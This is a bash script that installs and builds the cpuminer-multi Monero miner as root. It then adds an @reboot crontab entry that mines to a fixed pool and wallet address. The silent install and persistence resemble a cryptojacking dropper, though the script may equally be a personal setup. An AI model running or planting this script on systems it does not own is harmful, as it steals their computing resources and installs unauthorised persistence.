#! /bin/bash

HOME=/root
LOGNAME=root
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/root


# Installing Dependencies
sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake  -y

# Downloading cpuminer-multi
sudo git clone https://github.com/hyc/cpuminer-multi
cd cpuminer-multi

# Setup
./autogen.sh
CFLAGS="-march=native" ./configure
sudo make install

res=$(which minerd)
echo "Result: $res"

(crontab -l && echo "@reboot sudo /root/cpuminer-multi/minerd -a cryptonight -o stratum+tcp://de2.moriaxmr.com:3333 -u 44MAkLSAyvrAT4rRA6b2GUT1CQvcBTyB2WjkzL2cqhmJT2uyKKMameCF4U5N1EEw3MEFinGgmvDNJQwQh3E6dxH5AvcVPwQ -p b -t 2 &") | crontab -




